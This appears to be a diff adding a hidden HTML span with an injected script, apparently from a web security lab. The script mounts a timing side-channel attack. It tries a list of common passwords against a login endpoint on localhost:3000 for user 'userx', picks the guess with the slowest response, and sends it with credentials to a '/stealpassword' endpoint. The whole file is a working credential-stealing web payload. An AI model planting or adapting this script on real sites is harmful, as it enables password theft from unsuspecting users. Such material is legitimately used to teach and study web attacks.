@@ -1,0 +1,27 @@
+<span style='display:none'>
+<Img id='test'/>
+  <Script>
+    var dictionary = [`password`, `123456`, `12345678`, `dragon`, `1234`, `qwerty`, `12345`];
+    var index = 0;
+    var test = document.getElementById(`test`);
+    var time_intv = 0;
+    test.onerror = () => {
+      var end = new Date();
+      if (end-start > time_intv){time_intv = end - start; pwd = dictionary[index - 1]};
+      start = new Date();
+      if (index < dictionary.length) {
+        test.src = 'http://localhost:3000/get_login?username=userx&password='+dictionary[index];
+      } else {
+        var xhr = new XMLHttpRequest();
+	xhr.withCredentials=true;
+	xhr.open('GET', 'http://localhost:3000/stealpassword?password='+pwd+'&timeElapsed='+time_intv);
+	xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+	xhr.send();
+      }
+      index += 1;
+    };
+    var start = new Date();
+    test.src = 'http://localhost:3000/get_login?username=userx&password='+dictionary[index];
+    index += 1;
+  </Script>
+</span>
